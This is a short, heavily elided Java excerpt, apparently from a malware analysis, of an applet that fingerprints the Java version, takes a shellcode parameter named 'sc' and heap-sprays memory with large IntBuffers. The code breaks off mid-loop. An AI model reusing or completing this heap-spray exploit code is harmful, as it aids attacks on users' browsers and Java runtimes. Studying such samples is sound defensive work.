...
public class AppleT extends Applet
{
    ...
    public void init() {
        ...
        if (version_detect != "end") {
            try {
                this.spray(this.getParameter("sc"), string);
    ...
    public static String version_detect() {
        ...
        final String substring = (replaceAll = System.getProperty("java.version").replaceAll("_", ".")).substring(0, 3);
    ...
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 262144 - array.length;
        final IntBuffer[] array3 = new IntBuffer[50];
        for (int i = 0; i < 50; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(262144);
            for (int j = 0; j < n; ++j) {
